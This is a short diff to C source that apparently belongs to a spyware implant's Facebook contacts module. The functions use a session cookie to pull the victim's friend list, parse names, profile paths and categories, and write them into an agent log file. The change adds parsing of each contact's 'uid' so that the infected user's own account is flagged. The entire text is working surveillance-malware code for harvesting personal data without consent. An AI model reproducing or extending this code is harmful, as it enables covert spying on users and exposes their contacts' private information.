@@ -348,6 +348,7 @@ DWORD HandleFBMessages(char *cookie)
 #define FB_CONTACT_IDENTIFIER "\"user\",\"text\":\""
 #define FB_CPATH_IDENTIFIER ",\"path\":\""
 #define FB_CATEGORY_IDENTIFIER ",\"category\":\""
+#define FB_UID_IDENTIFIER "\"uid\":"
 DWORD HandleFBContacts(char *cookie)
 {
 	DWORD ret_val;
@@ -362,6 +363,7 @@ DWORD HandleFBContacts(char *cookie)
 	char category[256];
 	static BOOL scanned = FALSE;
 	HANDLE hfile;
+	DWORD flags;
 
 	CheckProcessStatus();
 
@@ -405,6 +407,19 @@ DWORD HandleFBContacts(char *cookie)
 	
 	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
 	for (;;) {
+		flags = 0;
+		parser1 = strstr(parser1, FB_UID_IDENTIFIER);
+		if (!parser1)
+			break;
+		parser1 += strlen(FB_UID_IDENTIFIER);
+		parser2 = strchr(parser1, ',');
+		if (!parser2)
+			break;
+		*parser2 = NULL;
+		if (!strcmp(user, parser1))
+			flags |= CONTACTS_MYACCOUNT;
+		parser1 = parser2 + 1;
+
 		parser1 = strstr(parser1, FB_CONTACT_IDENTIFIER);
 		if (!parser1)
 			break;
@@ -451,7 +466,7 @@ DWORD HandleFBContacts(char *cookie)
 		profile_w = UTF8_2_UTF16(profile_path);
 		category_w = UTF8_2_UTF16(category);
 
-		DumpContact(hfile, CONTACT_SRC_FACEBOOK, name_w, NULL, NULL, category_w, NULL, NULL, NULL, NULL, NULL, profile_w, 0);
+		DumpContact(hfile, CONTACT_SRC_FACEBOOK, name_w, NULL, NULL, category_w, NULL, NULL, NULL, NULL, NULL, profile_w, flags);
 		
 		SAFE_FREE(name_w);
 		SAFE_FREE(profile_w);
